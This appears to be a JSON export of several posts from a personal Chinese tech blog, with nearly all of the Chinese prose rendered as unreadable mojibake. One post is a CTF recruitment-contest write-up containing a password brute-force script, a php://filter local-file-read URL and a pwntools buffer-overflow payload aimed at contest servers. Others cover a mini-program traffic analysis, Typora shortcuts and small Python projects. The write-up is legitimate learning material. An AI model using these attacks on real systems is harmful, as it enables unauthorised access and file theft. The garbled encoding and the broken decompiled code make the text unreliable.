å…ˆç¡®å®šäº†è¿™æ˜¯ä¸ªä¸ªäººå¼€å‘çš„å°ç¨‹åºï¼Œçœ‹ç›¸å…³çš„åŸŸåé™¤äº†Tencentå®¶çš„ï¼Œä¸»è¦å°±æ˜¯wxa.game-a1.cn å’Œfree-api.heweather.comã€‚ æŸ¥äº†ä¸€ä¸‹ï¼Œåè€…æ˜¯ä¸€ä¸ªæŸ¥å¤©æ°”çš„APIï¼ˆéœ€è¦çš„è¯å¯ä»¥ç”¨ä¸€æ³¢ï¼‰ï¼ˆå°±æ˜¯å¾ˆè¿·æƒ‘ä¸ºå•¥è¿™é‡Œä¼šæœ‰è¿™ä¸ª å‰è€…æ˜¯ä¸€ä¸ªä¸ªäººçš„åŸŸåå§ï¼Œçœ‹æ ·å­æ˜¯ç”¨çš„ä¸€ä¸ªå¼€å‘å°ç¨‹åºçš„å¹³å°ã€‚æ ¹åŸŸåè¿˜æ˜¯ä¸ªåšå®¢ï¼Œé‡Œé¢è¿˜æœ‰æ­å»ºå¾®ä¿¡å°ç¨‹åºçš„ç»å†ã€‚ 2pingäº†ä¸€ä¸‹è¿™ä¸ªåŸŸåï¼Œå¾—åˆ°IPï¼š47.105.42.112 ç„¶åæŠ“äº†ä¸ªåŒ…ï¼Œè¿‡æ»¤åªçœ‹å…³äºè¿™ä¸ªIPçš„æ•°æ®åŒ…ã€‚å‘ç°æœ‰ä¸¤ä¸ªã€‚ å‰é¢ä¸€ä¸ªä¸æ‡‚ä»€ä¹ˆé¬¼å¡«äº†ä¸ªè¡¨ï¼Œä¼°è®¡æ”¶é›†äº†ä¸€æ³¢ä½¿ç”¨æ•°æ®ï¼Œå…ˆä¸ç®¡ã€‚é‡ç‚¹æ˜¯åé¢è¿™ä¸ªã€‚ å¾ˆæ˜æ˜¾æ˜¯è®¿é—®äº†http://wxa.game-a1.cn/wxa/qqnz2019/index.phpè¿™ä¸ªç½‘å€ã€‚ 3æµè§ˆå™¨å¯åŠ¨ï¼ŒF12å¤§æ³•å¥½å‘€ã€‚ å¥½ä¸€ä¸ªJSONå­—ç¬¦ä¸²ï¼Œæ¥åˆ†æä¸€ä¸‹å§ã€‚ qrcodeå¾ˆæ˜æ˜¾æ˜¯äºŒç»´ç å•¦ï¼Œä¸‹è½½ä¸‹æ¥è§£ç å‘ç°è°ƒç”¨äº†qqå°ç¨‹åºçš„æ¥å£å§ï¼Œè®¿é—®ä¼šè·³è½¬åˆ°è¿™ä¸ªå°ç¨‹åºã€‚ urlå’Œurl1éƒ½æ˜¯ä¸€æ ·çš„ï¼ŒæŒ‡å‘äº†ä¸€ä¸ªé˜¿é‡Œäº‘çš„å¯¹è±¡å­˜å‚¨ã€‚â†“ https://oos-pic.oss-cn-beijing.aliyuncs.com/2019%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/1.png å¤šæ¬¡åˆ·æ–°å‘ç°å¥½åƒçš„ç¡®å°±é‚£å‡ å¼ å›¾ç‰‡ï¼Œæ”¹å˜äº†ä¸€ä¸‹x.pngè€Œå·²ã€‚ è€Œä¸”çš„ç¡®è¿™å°±æ˜¯å‡çš„å›¾å•¦ã€‚ï¼ˆä¸ç„¶å“ªæ¥çš„ç”¨æˆ·æ•°æ®å¯ä»¥åˆ†æ 4æ—¢ç„¶éƒ½çŸ¥é“æ˜¯å‡ å¼ å›¾ç‰‡è€Œå·²äº†ï¼Œé‚£é¡ºä¾¿å°±çˆ¬ä¸‹æ¥å§ã€‚ PyCharm å¯åŠ¨ï¼Œæ¥å†™ä¸€å†™jioæœ¬ã€‚ å†™rangeæ˜¯å› ä¸ºéšä¾¿è¯•äº†ä¸€ä¸‹ï¼Œæœ¬æ¥å°±æ²¡æœ‰å‡ å¼ å›¾ç‰‡è€Œå·²ï¼Œç„¶è€Œæ‡’å¾—æ‰‹åŠ¨ä¸‹è½½ã€‚ çœ‹ç»“æœçš„ç¡®å°±7å¼ å›¾ç‰‡ã€‚ã€‚ å‘å°±è¿™å‡ å¼ äº†â†“ 5çœ‹æ ·å­å°ç¨‹åºè·å–ä¸ªäººå¤´åƒï¼Œç„¶åå†å’ŒäºŒç»´ç ã€ä¸Šé¢çš„ä»»æ„ä¸€å¼ å›¾æ‹¼æ¥åœ¨ä¸€èµ·è€Œå·²å§ã€‚ å°±æ˜¯è¿™ä¸ªform.phpï¼Œçœ‹æ ·å­æ˜¯ç”¨æ¥ç»Ÿè®¡ä½¿ç”¨æ•°æ®çš„å§emmmé—®é¢˜ä¸å¤§ã€‚ å°ç»“å“‡å‘œæŠ˜è…¾äº†ä¸€ä¸ªä¸­åˆå¥½æ°”å•Šï¼Œï¼ˆæœ‰æ¯’ ä¸æŠ˜è…¾ä¼šæ­» ä¸ç®¡æ€ä¹ˆè¯´è¿™ä¸ªå°ç¨‹åºè¿˜æ˜¯æœ‰ç‚¹æ„æ€çš„ï¼Œè‡³å°‘åšçš„é‚£å‡ å¼ å›¾ç‰‡è¿˜æŒºä¸é”™çš„å“ˆå“ˆå“ˆã€‚ ä¸è¿‡è¦åæ§½è¿™ä¸ªå¹¿å‘Šè¶…çº§è®¨åŒemmm å°±è¿™æ ·å§ã€‚ çˆ¬å–å›¾ç‰‡çš„æºç  å’Œ çˆ¬åˆ°çš„å›¾ç‰‡æ”¾åˆ°äº†Githubä¸Šäº†ï¼Œæœ‰éœ€è¦çš„å¯ä»¥å»çœ‹çœ‹å§ã€‚ URLï¼šè¿™æ˜¯ç½‘å€ https://github.com/miaotony/Scrapy_2019Year-end_Report","path":"2019/12/04/Scrapy_2019Year-end_Report/"},{"title":"CTF | Asuriæˆ˜é˜Ÿ 2019æ‹›æ–°èµ› WriteUP","text":"Asuri æ‹›æ–°èµ›WriteUP 20191117ç½‘å€ï¼š http://139.9.212.218:8000/challenges å®˜æ–¹å®‰æ’åŠWriteUPï¼šhttps://github.com/Kit4y/2019-Asuri-Recruitment-Src-and-wp testflag{this_is_test_flag} misc-ç­¾åˆ° base64è§£ç å³å¾—åˆ° flag{1_want_jiamus_p0wer} baby-web-ä¹æ›²åå…«å¼¯ http://desperadoccy.club:39011/ base64è§£ç  Asuri{view_source's_power} å¿«é€Ÿè®¡ç®— http://47.102.107.100:39012/ è¿ç»­20æ¬¡åœ¨1-2så†…åˆ¤æ–­æ˜¯å¦æ­£ç¡®ï¼Œå³å¯å¾—åˆ°flagã€‚ import requests import re import time s = requests.Session() r = s.get(\"http://47.102.107.100:39012/\") for i in range(20): time.sleep(1) equation = re.findall(r'&lt;div&gt;(.*)=(.*)&lt;/div&gt;', r.text)[0] print(equation) answer = eval(equation[0]) if answer == eval(equation[1]): values = {'answer': 'true'} else: values = {'answer': 'false'} r = s.post(\"http://47.102.107.100:39012/\", data=values) r.encoding = 'utf-8' print(r.text) Asuri{python_1s_th3_be3t_l4ngu4ge} medium_web_justburp http://139.9.212.218:39010/ æŸ¥æ‰¾ç½‘ç«™ç›®å½•ä¸‹çš„æ–‡ä»¶ è®¿é—®robots.txt å¾—åˆ°ï¼š è®¿é—®hint.php å¾—åˆ°ä¸€ä¸ªæ–‡ä»¶ å°è¯•ä»¥adminä½œä¸ºç”¨æˆ·åï¼Œç”¨ä»¥ä¸Šä¿¡æ¯ä½œä¸ºå¯†ç å†™è„šæœ¬è¿›è¡Œç™»å½•ï¼Œ ç„¶è€Œå¥½åƒæ²¡æœ‰æˆåŠŸï¼ˆæœ‰å¯èƒ½æœ‰æˆåŠŸçš„æ²¡çœ‹åˆ°ï¼Ÿï¼Ÿï¼Ÿ éš¾å—äº†ï¼Œç°åœºå†™çš„æ—¶å€™è„‘ä¹±äº†ï¼ŒæŠŠæ‰€æœ‰ç™»å½•æ•°æ®éƒ½æ‰“å°å‡ºæ¥äº†ï¼Œç„¶åæ²¡æ‰¾åˆ°flagâ€¦åŠ ä¸€ä¸ªifé‡æ–°æ¥å°±çœ‹åˆ°äº†æƒ¹emmm çˆ†ç ´ä¸€æ³¢ # -*- coding:utf-8 -*- import requests s = requests.Session() r = s.get(\"http://139.9.212.218:39010/index.php\") r.encoding = \"utf-8\" print(r.text) with open('name-pass.txt', 'r') as file: contents = file.read().split() # print(contents) passwords = contents for password in passwords: values = {'name': 'admin', 'password': password} r = s.get(\"http://139.9.212.218:39010/index.php\", params=values) r.encoding = 'utf-8' if 'å¯†ç é”™è¯¯' not in r.text: print(r.text) å³å¯å¾—åˆ° &lt;!DOCTYPE html&gt; &lt;html&gt;&lt;head&gt;&lt;meta charset=\"utf-8\" /&gt; &lt;title&gt;Hi hacker&lt;/title&gt; &lt;/head&gt; &lt;body bgcolor=\"bisque\"&gt; &lt;form action=\"index.php\" method=\"get\"&gt;ç”¨æˆ·åï¼š&lt;br&gt;&lt;input type=\"text\" name=\"name\"&gt;&lt;br&gt;å¯†ç ï¼š&lt;br&gt;&lt;input type=\"text\" name=\"password\"&gt;&lt;br&gt;&lt;br&gt;&lt;input type=\"submit\" value=\"ç™»é™†\"&gt; &lt;/form&gt; &lt;p&gt;hint:adminç”¨æˆ·çš„å¯†ç ä¼¼ä¹åœ¨æŸä¸ªé¡µé¢é‡Œ &lt;/p&gt; &lt;p&gt; çœ‹ä½ éª¨éª¼ç²¾å¥‡ï¼Œå°±å°†flagäº¤äºä½ äº†ï¼Asuri{Burp_1s_Gre@t}&lt;/p&gt; &lt;/body&gt; &lt;/html&gt; flag: Asuri{Burp_1s_Gre@t} å…¶å®è¿™é¢˜ç”¨BurpSuiteæ›´å¿«ï¼Œå¯¼å…¥å­—å…¸ç›´æ¥çˆ†ç ´éƒ½ä¸ç”¨è‡ªå·±å†™jioæœ¬ã€‚ã€‚ç„¶è€Œæˆ‘ç°åœºè¿˜åœ¨æœå®ƒæ€ä¹ˆç”¨â€¦â€¦ hard_web_phpæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€ http://139.9.212.218:39009/ æ”¹cookieé‡å‘ è®¿é—®read_file.phpï¼Œå¾—åˆ° è®¿é—®no_flag_here.php ï¼Œæ„é€ å‚æ•°è¿›å…¥æ ¹ç›®å½• ç„¶è€Œï¼emmmè¿™ä¸ªscandiræ€ä¹ˆè·å–è¿™ä¸ªflagæ–‡ä»¶å†…å®¹å•Šï¼ï¼ï¼ çœ‹äº†å¤§å¸ˆå‚…çš„WriteUPï¼Œå‘ç°PHPè¿˜å¯ä»¥è¿™ä¹ˆè¯»å–æ–‡ä»¶â€¦ï¼ˆä¸‹é¢ æ„é€ file=php://filter/read=convert.base64-encode/resource=+ç»å¯¹è·¯å¾„ http://139.9.212.218:39009/read_file.php?file=php://filter/read=convert.base64-encode/resource=../../../flag04ad59.php æˆ–è€… http://139.9.212.218:39009/read_file.php?file=php://filter/read=convert.base64-encode/resource=/flag04ad59.php å¾—åˆ°ä¸€ä¸²Base64å­—ç¬¦ä¸² PD9waHANCiAgICAvL0FzdXJpe1dFQl9XSU5ORVJ9DQo/Pg== è§£ç åï¼š &lt;?php //Asuri{WEB_WINNER} ?&gt; flag: Asuri{WEB_WINNER} easy_pwn from pwn import * # å¼•å…¥pwntoolsåº“ import time sh = remote('49.235.243.206', 9001) # åˆ›å»ºä¸é¶åœºæœåŠ¡å™¨çš„è¿æ¥ offset = 0x60+0x8 # åç§» system_addr = 0x400766 # systemå‡½æ•°åœ°å€ for i in range(4, 20): sh.recvuntil('Please input your passworld size') sh.sendline(p64(i)) # å‘ç¨‹åºå‘é€æ•°æ® sh.recvuntil('Please input your password') payload = offset * b'a' + p64(system_addr) # æ„é€ æ”»å‡»æ•°æ® sh.sendline(payload) # å‘ç¨‹åºå‘é€æ•°æ® sh.interactive() # å°†æ§åˆ¶æµä»ç¨‹åºè½¬ç§»åˆ°è‡ªå·±è¿™é‡Œ å®Œäº†ä¸ä¼šå†™ï¼Œå˜¤å˜¤å˜¤ medium_rev#!/usr/bin/env python # encoding: utf-8 # å¦‚æœè§‰å¾—ä¸é”™ï¼Œå¯ä»¥æ¨èç»™ä½ çš„æœ‹å‹ï¼http://tool.lu/pyc def encrypt_for_each(): index = [ 0] * 100 for i in range(100): tmp = i ^ 77 yield tmp None def encrypt(msg, key): iters = encrypt_for_each() enc = [] for (m, k) in zip(msg, key): e = m ^ k ^ iters.__next__() enc.append(e) return enc def generate_key(): def check_prime(num): if num &lt; 2: return False for i in range(2, num): if num % i == 0: return False return True test = [ 8, 61, 85, 25, 121, 53, 26, 0, 81, 52, 124, 22, 137, 56, 94, 107, 59, 132, 90, 3, 51, 46, 77, 127, 35, 86, 134, 20, 73, 32, 66, 99, 7, 69, 122, 4, 142, 23, 80, 109, 60, 79, 36, 62, 5, 104, 102, 14, 58, 149, 31, 96, 68, 114, 116, 11, 95, 87, 146, 123, 15, 135, 33, 37, 110, 19, 106, 30, 130, 101, 97, 98, 141, 2, 47, 6, 24, 131, 16, 111, 150, 55, 1, 76, 12, 138, 64, 120, 118, 29, 145, 147, 9, 113, 103, 40, 92, 71, 72, 129, 139, 100, 63, 133, 42, 125, 74, 88, 143, 144, 38, 140, 67, 119, 136, 115, 54, 21, 50, 108, 128, 57, 112, 43, 84, 70, 78, 28, 41, 93, 44, 13, 18, 10, 48, 27, 83, 65, 17, 75, 126, 39, 49, 91, 34, 82, 45, 148, 105, 89, 117] key = (lambda .0: continue[ i for i in .0 ])(filter(check_prime, test)) return key if __name__ == '__main__': key = generate_key() msg = [ 22, 21, 167, 66, 9, 27, 3, 119, 42, 99, 68, 86, 13, 166, 3, 120, 22, 59, 9, 77, 40, 3, 233, 41, 67, 108, 80, 179, 86, 36, 31, 107, 77, 4, 75] print('encryt message is {}'.format(msg)) lambda .0: continue[ i for i in .0 ] è¿™ä¸ª.0æ‰§è¡Œä¸äº†å•Šemmm æˆ‘æ¢æˆxä¹ŸæŠ¥é”™å”‰ï¼ middle_pwn å°ç»“ ç¬¬ä¸€æ¬¡æ‰“CTFå‘¢ï¼Œè™½ç„¶åªæ‹¿äº†ä¸ªç¬¬å…­ï¼Œè¿˜æ‹¿äº†ä¸ªå¨ƒå¨ƒ233 é™¤äº†çŸ³æ¦´å›­çš„çœŸçš„æ²¡å¤šå°‘æ‰“è¿™ä¸ªæ¯”èµ›çš„å‘€ã€‚ æˆ‘å¥½èœå•Šï¼Œè¿™æ¬¡ä¸€é¢˜pwnéƒ½æ²¡å†™å‡ºæ¥ï¼Œå¥½éš¾è¿‡å˜¤å˜¤å˜¤ ç°åœºæŸ¥BurpSuiteæ€ä¹ˆç”¨ä¹Ÿæ˜¯ç»äº†ï¼ˆé‚£èŠ‚åŸ¹è®­æˆ‘æ²¡å»emmm æ€»ä¹‹CTFè¿˜æ˜¯æŒºå¥½ç©çš„å“ˆå“ˆå“ˆå“ˆï¼Œæœ‰ç©ºè¿˜æ˜¯è¦å¥½å¥½å­¦ä¸€æ³¢å‘¢ï¼ ç­‰æˆ‘æœ‰ç©ºå†æŠ˜è…¾ä¸€ä¸‹ï¼Œæ­ä¸ªåšå®¢å§ å’•å’•å’• 20191128 æ›´æ–°ï¼šæˆ‘æ¥æŠ˜è…¾äº†ï¼Œå˜»å˜»å˜»ï¼","path":"2019/11/28/CTF_2019Asuri_Recruitment/"},{"title":"test","text":"æµ‹è¯•ä¸€ä¸‹å†æ¥ä¸€ä¸‹å“ˆ~ å–µ~~å˜¿å˜¿å˜¿","path":"2019/11/28/test/"},{"title":"typora_tips ä¸€äº›å…³äºtyporaçš„å¿«æ·é”®","text":"[TOC] â€‹ éšä¾¿ç»ƒç»ƒtyporaï¼Œå‚è€ƒäº†ä¸€äº›ç½‘ä¸Šçš„èµ„æ–™ï¼Œé¡ºä¾¿è®°å½•ä¸€ä¸‹ï¼Œæ–¹ä¾¿åé¢æŸ¥é˜…å“ˆ~ æ ‡é¢˜ctrl + æ•°å­—é”® æœ€å¤šæ”¯æŒåˆ°å…­çº§æ ‡é¢˜ ä¸€çº§æ ‡é¢˜ äºŒçº§æ ‡é¢˜ ä¸‰çº§æ ‡é¢˜ å››çº§æ ‡é¢˜ äº”çº§æ ‡é¢˜ å…­çº§æ ‡é¢˜ å–æ¶ˆæ ‡é¢˜â€‹ ctrl + æ•°å­—0 æ ‡é¢˜å–æ¶ˆæ ‡é¢˜ åŠ ç²—ctrl + B è¿™æ˜¯åŠ ç²— å€¾æ–œctrl + I è¿™æ˜¯å€¾æ–œ ä¸‹åˆ’çº¿ctrl + U è¿™æ˜¯ä¸‹åˆ’çº¿ åˆ é™¤çº¿alt + shift + 5 è¿™æ˜¯åˆ é™¤çº¿ æ— åºåˆ—è¡¨ - + space + enter miao miaomiao! åµŒå¥— å†æ¥åµŒå¥— ä¸Šä¸€ä¸ªå±‚æ¬¡ å–µï¼ æœ‰åºåˆ—è¡¨æ•°å­—é”®. + space + enter ç¬¬ä¸€ä¸ª ç¬¬äºŒä¸ª åµŒå¥—ä¸€ä¸‹ å†æ¥ä¸€ä¸‹ å†åµŒå¥—ä¸€ä¸ª ç»§ç»­ ç»§ç»­æ¥ å°±è¿™æ ·å§ ä»»åŠ¡åˆ—è¡¨- [] TODO - [x]å·²å®Œæˆ è¿™æ˜¯å¾…å®Œæˆçš„ è¿™ä¸ªå·²å®Œæˆäº† å¼•ç”¨&gt; + space + enter æˆ–è€… ctrl + shift + Q è¿™å°±æ˜¯å¼•ç”¨ è¿™ä¹Ÿæ˜¯ â€‹ è¿˜å¯ä»¥åµŒå¥—å¼•ç”¨ â€‹ å†æ¥ä¸€ä¸ª è¿™ä¹Ÿè¡Œ ä¸€æ ·çš„ æ’å…¥å›¾ç‰‡ctrl + shift + I ç½‘ä¸Šè¯´ç”¨MPicåšå›¾åºŠæŒºä¸é”™çš„ã€‚ï¼ˆè¿˜æ²¡è¯•è¿‡ ç›´æ¥æ‹–è¿›æ¥ä¹Ÿè¡Œ æ’å…¥é“¾æ¥ctrl + K è¿™æ˜¯é“¾æ¥ï¼Œè·³è½¬åˆ°æˆ‘çš„åšå®¢å“ˆ æ’å…¥è¡¨æ ¼ctrl + T mm text æµ‹è¯• å†æµ‹è¯• 123 456 æ’å…¥ä»£ç å•è¡Œä»£ç ï¼ˆæ–‡ä¸­çš„ä»£ç ï¼‰ctrl + shift + ` `è¾“å…¥ä»£ç ` å¤šè¡Œä»£ç ï¼ˆä»£ç å—ï¼‰ctrl + shift + K ``` è¾“å…¥ä»£ç  ``` print(\"Hello world!\\n\") # Python printf(\"Hello, this is C.\") // C disp(\"Hello, this is MATLAB.\") % MATLAB print(\"Hello, this is lua.\") -- lua æ’å…¥è¡¨æƒ…:åç§°: (è‹±æ–‡çŠ¶æ€ä¸‹) ğŸ± ğŸ¶ PSï¼šå¾®è½¯è¾“å…¥æ³•å¯ä»¥ç”¨ctrl + shift + Bå¼¹å‡ºè¡¨æƒ…çª—å£ã€‚ ğŸ˜€ğŸ‘Œ æ’å…¥åˆ†å‰²çº¿--- ä¸‹é¢æ˜¯åˆ†å‰²çº¿ æ’å…¥é«˜äº®æ˜¾ç¤º==ä¸­é—´å†™æ–‡å­—== ==è¿™æ˜¯é«˜äº®== æ’å…¥è„šæ³¨æ–‡å­—[^è„šæ³¨] ç¤ºä¾‹^1 æ’å…¥å…¬å¼ctrl + shift + M æˆ–è€… è¡Œå†…å…¬å¼ï¼ˆå†…è”å…¬å¼ï¼‰ï¼š $å…¬å¼$ è¡Œé—´å…¬å¼ï¼š $$ å…¬å¼ $$ $$\\lim_{x\\to +\\infty} \\frac{1}{x}=0$$åŠ ä¸ªæ¡†è¯•è¯•ï¼ˆ\\boxed{}ï¼‰ï¼š$$\\boxed{ \\overrightarrow{AB}}$$ è¿™æ˜¯è¡Œå†…å…¬å¼ $ \\sqrt[3]{test} $ ï¼Œå¦™å•Š~ å…·ä½“çš„è¿˜å¾—æ…¢æ…¢çœ‹å‘¢ã€‚ é¡ºä¾¿å­¦ä¸€æ³¢LaTexä¹ŸæŒºä¸é”™çš„~ æ’å…¥ç›®å½•[toc] + ENTER å°±æ˜¯æœ€ä¸Šé¢é‚£ä¸ªå•¦~ æ–°å»ºæ–‡ä»¶ctrl + N é€‰ä¸­ä¸­æ–‡/è‹±æ–‡ctrl + D miao miao~ ctrl + Shift + å·¦/å³ å¿«é€Ÿé€‰ä¸­æ•´ä¸ªè¯è¯­/å•è¯ã€‚ é€‰ä¸­æ•´è¡Œctrl + L æŸ¥æ‰¾ctrl + F æ›¿æ¢ctrl + H è·³è½¬åˆ°å¼€å¤´/ç»“å°¾ctrl + HOME è·³è½¬è‡³æ–‡ç« å¼€å¤´ ctrl + END è·³è½¬è‡³æ–‡ç« æœ«å°¾ æ‰“å¼€æ–‡ä»¶ï¼ˆç¬”è®°ï¼‰ctrl + P å…¨å±æ˜¾ç¤ºF11 ä¾§è¾¹æ ctrl + shift + L æ¸…é™¤æ ¼å¼ctrl + \\ åˆ‡æ¢åˆ°ä»£ç æ¨¡å¼ctrl + / ==etc.== è¿˜æœ‰æŒºå¤šè¿˜è¦æ…¢æ…¢å»å‘æ˜å‘¢~ é¡ºä¾¿è¯´ä¸€ä¸‹ Snipaste è¿™ä¸ªæˆªå›¾å·¥å…·æŒºå¼ºå¤§çš„ å®˜ç½‘ https://zh.snipaste.com/ æœ¬æ–‡æ¬è¿è‡ªæˆ‘çš„csdnåšå®¢å•¦~","path":"2019/08/29/typora_tips/"},{"title":"å°æƒ³æ³• | å¼€æºä¸€ä¸ªè‡ªå·±çš„Pythonå°é¡¹ç›®ã€ŒPark at easeã€åœè½¦åœºç®¡ç†ç³»ç»Ÿ","text":"Park at easeåœè½¦åœºç®¡ç†ç³»ç»ŸåŸºäºPythonå®ç° Park Management SystemBased on Pythonâ€¦ print('Hello, this is Park_at_ease!') ä¸€äº›è¯´æ˜è¿™ä¸ªé¡¹ç›®æœ¬æ¥æ˜¯ç»™éƒ¨é—¨é‡Œå°å¹²äº‹å¸ƒç½®çš„ã€Š2019å¯’å‡è¿›é˜¶æŒ‡å—ã€‹é‡Œ Section2 çš„è¯¾è®¾ä»»åŠ¡ï¼ˆé¢˜ç›®åŸºæœ¬ä¸Šæ˜¯æ ¹æ®è‡ªå·±çš„æƒ³æ³•å‡ºçš„ï¼‰ï¼Œå½“æ—¶è‡ªå·±æ­£å¥½åœ¨å­¦Pythonï¼Œå°±æƒ³æ‹¿è¿™ä¸ªé¡¹ç›®ç»ƒç»ƒæ‰‹ï¼Œäºæ˜¯å°±æœ‰äº†è¿™ä¸ªåŸºäºPythoné¢å‘å¯¹è±¡å®ç°çš„åœè½¦åœºç®¡ç†ç³»ç»Ÿã€‚ åŸæ¥è¿™ä¸ªé¡¹ç›®éƒ½æ˜¯è‡ªå·±å¼„ç€ç©çš„ï¼Œè¿™å‡ å¤©æ•´ç†æ–‡ä»¶å‘ç°å‡ ä¸ªæœˆå‰è¿˜å†™äº†è¿™ç©æ„å„¿ï¼Œè¿˜æŒºæœ‰æ„æ€çš„ã€‚è¿™ä¸ªé¡¹ç›®å…¶å®è¿˜æœ‰å¾ˆå¤šå¯ä»¥å¼€å‘çš„ç©ºé—´çš„ï¼Œäºæ˜¯å°±æƒ³ç€æŠŠå®ƒå¼€æºäº†å§ï¼Œå¸Œæœ›å¤§å®¶å¯ä»¥ä¸€èµ·æ¥å®Œå–„å‘¢ï¼ PS:åŸåˆ™ä¸Šä¸æä¾›æŠ€æœ¯æ”¯æŒå“ˆã€‚ é¡¹ç›®ç½‘ç«™ï¼ˆåŸºäºGithub Pagesæ­å»ºï¼‰ï¼šæ¥ç‚¹æˆ‘å“ˆ æˆ– https://miaotony.github.io/Park_at_ease/ GitHubé¡¹ç›®ç½‘å€ï¼šæ¥ç‚¹æˆ‘é¸­ æˆ– https://github.com/miaotony/Park_at_ease æ¬¢è¿å¤§å®¶åœ¨æ­¤åŸºç¡€ä¸Šç»§ç»­å®Œå–„é¸­~æ¬¢è¿Starã€Forkã€æPR &amp; issueï¼ ä½¿ç”¨åŠè½¬è½½æ—¶è¯·æ³¨æ˜å‡ºå¤„ï¼Œä¿ç•™ä½œè€…ä¿¡æ¯ï¼Œä¸¥ç¦å•†ç”¨ï¼Œä¸¥ç¦ç”¨äºå®Œæˆè¯¾è®¾ä»»åŠ¡ï¼Œè°¢è°¢ï¼ Overview è¿™æ˜¯ç¼–è€…å‚è€ƒäº†ä¸€å°éƒ¨åˆ†ç½‘ç»œä¸Šç›¸å…³çš„é¢˜ç›®ï¼Œç»“åˆå®é™…ç”Ÿæ´»ï¼Œèåˆäº†è‡ªå·±ä¸€äº›æƒ³åˆ°çš„ï¼Œç»™å°å¹²äº‹ä»¬å‡ºçš„é¢˜ç›®ã€‚è¿™é‡Œç›´æ¥å°±æˆªå±æ”¾å‡ºæ¥å§ï¼ŒPDFè¿˜æœ‰åˆ«çš„å†…å®¹æ‡’å¾—æ”¹äº†ã€‚å¦‚æœæœ‰ä»€ä¹ˆå»ºè®®æ¬¢è¿åœ¨GitHubä¸Šæissueæˆ–è€…åœ¨è¿™é‡Œè¯„è®ºå“ˆ~ï¼ TODO ç®¡ç†å‘˜ç•Œé¢ Administrator Interface æ–‡ä»¶æ“ä½œ FileIO ç™»å½•ç•Œé¢ Login ç™»å½•åŠ å¯† Login Encryption å›¾å½¢ç•Œé¢ GUI å¤šçº¿ç¨‹æˆ–å¤šè¿›ç¨‹ Multithreading or Multiprocessing é‚®ä»¶æ¨é€ Email Push å¾®ä¿¡æ¨é€ WeChat Push TCP åµŒå…¥å¼å¼€å‘ Embedded Development etc. å…·ä½“è¯·ç§»æ­¥åˆ°GitHubé¸­ï¼ é¡¹ç›®ç½‘ç«™ï¼ˆåŸºäºGithub Pagesæ­å»ºï¼‰ï¼šæ¥ç‚¹æˆ‘å“ˆ æˆ– https://miaotony.github.io/Park_at_ease/ GitHubé¡¹ç›®ç½‘å€ï¼šæ¥ç‚¹æˆ‘é¸­ æˆ– https://github.com/miaotony/Park_at_ease æºœäº†æºœäº†ä¸‹æ¬¡å†è§å•¦~ æ¬è¿è‡ªæˆ‘çš„csdnåšå®¢å•¦~","path":"2019/08/18/Park_at_ease/"},{"title":"å°æƒ³æ³• | åŸºäºæ¨¡æ‹Ÿç‚¹å‡»å®ç°æ•°æ®è‡ªåŠ¨æµ‹é‡","text":"æ¬è¿ä¸€ç¯‡ä¹‹å‰å†™çš„å°æƒ³æ³•å•¦~ èµ·å› äººå·¥æ™ºèƒ½â€”â€”å…ˆäººå·¥åæ™ºèƒ½å“ªé‡Œæœ‰ç°æˆæ•°æ®ç»™ä½ è¿˜ä¸æ˜¯äººå·¥æ‰‹åŠ¨å»æµ‹â€¦â€¦ å¤§åˆ›è¦æµ‹æ•°æ®emmmï¼Œç®€å•æ¥è¯´å°±æ˜¯ç‚¹ç‚¹æŒ‰é’®ï¼Œç­‰å®ƒæ•°æ®æµ‹é‡å®Œæˆï¼Œç„¶åæŒ‰ç…§å‘½åè§„èŒƒä¿å­˜ã€‚å°±æ˜¯è¿™ä¸ªä¹Ÿå¤ªæ¯ç‡¥äº†8ï¼Œæ•ˆç‡è¿˜ä½ã€‚ä¸å¦‚pyä¸€ä¸‹å†™ä¸ªè‡ªåŠ¨æ‰§è¡Œçš„ï¼è¯´å†™å°±å†™å‘—ï¼ˆæ–œçœ¼ç¬‘.gif) åˆä»£ç‰ˆæœ¬å‘ç°Pythonæœ‰ä¸ªç°æˆçš„ç¬¬ä¸‰æ–¹åº“å«PyAutoGuiåº“ï¼Œå®ƒç»™çš„å‡½æ•°è¿˜æ˜¯æŒºæ–¹ä¾¿çš„ã€‚æŒ‰ç…§æµ‹æ•°æ®æ“ä½œçš„æµç¨‹ç”¨ä»£ç è¿˜åŸä¸€éï¼Œæµ‹è¯•å‘ç°é€Ÿåº¦å¤ªå¿«äº†ç”µè„‘åƒä¸æ¶ˆï¼Œäºæ˜¯ä¹åˆ°å¤„åŠ å»¶æ—¶233ã€‚ æ€»ä¹‹è¿˜æ˜¯æŒºä¸é”™çš„å§è¾“å…¥è§’åº¦ã€æ¬¡æ•°ã€å¼€å§‹indexï¼ˆç¨‹åºå´©çš„æ—¶å€™å¤‡ç”¨ï¼‰ï¼Œç„¶åå°±å¯ä»¥è‡ªåŠ¨å¼€å§‹æµ‹é‡ï¼Œæ–°å»ºæ–‡ä»¶å¤¹ï¼ŒæŒ‰é¡ºåºå‘½åä¿å­˜ã€‚ ç†è®ºä¸€å¤©å¯æµ‹çš„æ•°æ®é‡ä»270ç»„æé«˜åˆ°435ç»„ï¼Œæ•ˆç‡æå‡äº†61%å§ï¼ è¿˜è¦æ„Ÿè°¢æ½‡æ½‡å¼Ÿå¼Ÿé™ªæˆ‘debug å˜»å˜»å˜»~ å‡çº§ç‰ˆ Update on 20190725. ä¹‹å‰å†™çš„è‡ªåŠ¨æµ‹æ•°æ®çš„ç¨‹åºè¿˜æœ‰ç‚¹å°é—®é¢˜ï¼Œä»Šå¤©åˆæ›´æ–°äº†ä¸¤ä¸ªç‰ˆæœ¬ã€‚ã€‚ ç”±äºæµ‹é‡è½¯ä»¶çš„é—®é¢˜ï¼Œæ¯ç»„éƒ½ä¼šæ¼ä¸€äº›æ•°æ®ï¼Œæ‰€ä»¥è¿˜è¦æ‰‹åŠ¨è¡¥æµ‹ã€‚ äºæ˜¯ä¹ä»Šå¤©åŠ äº†ä¸ªæ–‡ä»¶æ˜¯å¦å­˜åœ¨çš„åˆ¤æ–­ï¼Œç¡®å®šä¿å­˜æˆåŠŸä¹‹åæ‰ç»§ç»­ä¸‹ä¸€ç»„æµ‹é‡ï¼Œè¿™æ ·å°±ä¸ç”¨è¡¥æµ‹äº†ï¼ å¦å¤–è¿˜åŠ å…¥äº†logï¼Œè®°å½•æ—¥å¿—æ–‡ä»¶æ–¹ä¾¿æ£€æŸ¥é”™è¯¯ã€‚ 